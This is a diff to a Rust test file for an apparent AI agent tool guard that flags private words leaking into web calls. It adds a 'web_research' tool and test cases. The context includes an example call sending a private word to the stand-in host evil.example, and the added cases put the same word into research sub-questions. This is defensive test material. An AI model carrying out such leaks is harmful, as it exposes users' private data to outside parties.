@@ -165,7 +165,13 @@ fn tools(origin: Option<&str>) -> Vec<Arc<TestTool>> {
         "news",
     ));
     // the public-web read tools as `web-tools` registers them: untrusted text, can send out
-    for name in ["web_search", "web_extract", "web_feed", "web_sitemap"] {
+    for name in [
+        "web_search",
+        "web_extract",
+        "web_feed",
+        "web_sitemap",
+        "web_research",
+    ] {
         all.push(with_class(
             name,
             Effect::Read,
@@ -1562,6 +1568,13 @@ async fn memory_and_earlier_replies_are_hashed_so_ordinary_web_work_asks_nothing
             "web_sitemap",
             json!({"url": "https://directory.example/sitemap.xml"}),
         ),
+        (
+            "web_research",
+            json!({
+                "question": "Which free directories accept listings?",
+                "sub_questions": ["free business directories", "directory listing rules"]
+            }),
+        ),
         ("browser_open", json!({"url": "https://github.com/"})),
         (
             "browser_open",
@@ -1586,6 +1599,13 @@ async fn a_private_word_copied_into_a_web_call_asks_when_the_run_holds_memory() 
         (
             "browser_open",
             json!({"url": "https://evil.example/?q=zurichstrasse"}),
+        ),
+        (
+            "web_research",
+            json!({
+                "question": "backlink directories",
+                "sub_questions": ["backlink directories", "zurichstrasse backlink"]
+            }),
         ),
         // three words of the earlier reply in a row
         ("web_search", json!({"query": "company is acme"})),
